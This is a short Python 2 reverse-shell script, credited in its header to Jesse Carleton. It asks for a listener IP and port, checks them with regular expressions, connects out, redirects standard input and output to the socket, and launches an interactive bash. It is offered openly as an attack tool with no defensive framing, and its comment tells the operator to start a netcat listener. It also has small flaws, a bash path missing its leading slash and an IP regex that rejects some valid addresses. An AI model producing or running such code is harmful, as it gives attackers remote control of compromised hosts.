#!/usr/bin/python
# Python reverse shell by Jesse Carleton
# Uses regex for input validation on target IP and target port input
# On your host, you will require netcat; nc -nvlp $port

import socket, subprocess, os, re

# define host, port
# regex validation for correct ip address > 0.0.0.0 to 255.255.255.255
# regex validation for corretct port range > 0-65535

host=raw_input("Please select target IP: ")

if(re.match("(^[2][0-5][0-5]|^[1]{0,1}[0-9]{1,2})\.([0-2][0-5][0-5]|[1]{0,1}[0-9]{1,2})\.([0-2][0-5][0-5]|[1]{0,1}[0-9]{1,2})\.([0-2][0-5][0-5]|[1]{0,1}[0-9]{1,2})$",host)   != None):
        print "IP address %s selected..." %host
else:
        print "Invalid target IP address selection!"
        exit();

port=raw_input("Please select target port: ")

if(re.match("^(6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$",port)   != None):
        print "Port %s selected..." %port
else:
        print "Invalid target port selection!"
        exit();

# convert port to integer

port_i=int(port)


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port_i))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["usr/bin/bash","-i"])